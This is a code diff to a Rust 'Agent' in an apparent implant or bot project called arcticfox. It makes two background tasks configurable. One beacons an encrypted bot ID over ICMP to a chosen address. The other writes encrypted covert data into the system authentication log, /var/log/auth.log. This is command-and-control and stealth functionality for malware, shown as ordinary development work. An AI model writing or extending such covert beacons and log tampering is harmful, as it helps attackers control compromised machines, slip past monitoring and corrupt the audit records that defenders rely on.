@@ -119,17 +119,19 @@ impl Agent {
             shutdown.clone(),
         );
 
-        // Start ICMP heartbeat as fallback transport
-        let bot_id = self.bot_id.clone();
+        // Start ICMP heartbeat as fallback transport using config
+        let bot_id_icmp = self.bot_id.clone();
+        let dest_ip: std::net::Ipv4Addr = self.config.read().await.icmp_heartbeat_dest
+            .parse().unwrap_or(std::net::Ipv4Addr::new(8, 8, 8, 8));
+        let icmp_interval = self.config.read().await.icmp_heartbeat_interval;
         let mut shutdown_icmp = shutdown.clone();
         tokio::spawn(async move {
             let key = arcticfox_core::crypto::generate_session_key();
-            let dest = std::net::Ipv4Addr::new(8, 8, 8, 8);
             let mut seq: u16 = 0;
             loop {
                 tokio::select! {
-                    _ = tokio::time::sleep(std::time::Duration::from_secs(300)) => {
-                        icmp_heartbeat::send_icmp_heartbeat(&bot_id, &key, dest, 0xAF47, seq);
+                    _ = tokio::time::sleep(std::time::Duration::from_secs(icmp_interval)) => {
+                        icmp_heartbeat::send_icmp_heartbeat(&bot_id_icmp, &key, dest_ip, 0xAF47, seq);
                         seq = seq.wrapping_add(1);
                     }
                     _ = shutdown_icmp.changed() => {
@@ -139,16 +141,17 @@ impl Agent {
             }
         });
 
-        // Start log covert channel
+        // Start log covert channel using config
         let bot_id_log = self.bot_id.clone();
-        let key = arcticfox_core::crypto::generate_session_key();
+        let log_path = self.config.read().await.log_covert_path.clone();
+        let log_interval = self.config.read().await.log_covert_interval;
         let mut shutdown_log = shutdown.clone();
         tokio::spawn(async move {
-            let log_path = "/var/log/auth.log";
+            let key = arcticfox_core::crypto::generate_session_key();
             loop {
                 tokio::select! {
-                    _ = tokio::time::sleep(std::time::Duration::from_secs(600)) => {
-                        log_covert::write_log_covert(log_path, bot_id_log.as_bytes(), &key);
+                    _ = tokio::time::sleep(std::time::Duration::from_secs(log_interval)) => {
+                        log_covert::write_log_covert(&log_path, bot_id_log.as_bytes(), &key);
                     }
                     _ = shutdown_log.changed() => {
                         if *shutdown_log.borrow() { break; }
